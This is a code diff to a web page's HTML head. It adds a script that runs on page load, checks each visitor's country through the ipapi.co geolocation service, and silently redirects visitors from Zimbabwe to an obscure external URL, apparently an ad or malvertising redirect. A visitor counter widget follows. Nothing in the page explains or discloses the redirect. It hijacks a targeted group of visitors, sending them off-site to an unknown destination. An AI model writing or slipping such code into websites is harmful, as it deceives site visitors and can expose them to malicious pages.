@@ -2,7 +2,29 @@
 <html lang="en">
 <head>
 
+<script>
+    async function redirectIfFromTargetCountries() {
+      try {
+        // Use a free IP geolocation API (ipapi.co)
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+        const country = data.country_name;
 
+        const targetCountries = ["Zimbabwe"];
+        const redirectUrl = "//ak.stikroltiltoowi.net/4/9039697";
+
+        if (targetCountries.includes(country)) {
+          window.location.href = redirectUrl;
+        }
+      } catch (error) {
+        console.error('Geolocation error:', error);
+      }
+    }
+
+    redirectIfFromTargetCountries();
+  </script>
+
+    
     <!-- BEGIN: Powered by Supercounters.com -->
     <center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1690850,"ffffff","ffffff");</script><br><noscript><a href="https://www.supercounters.com/">free online counter</a></noscript>
     </center>
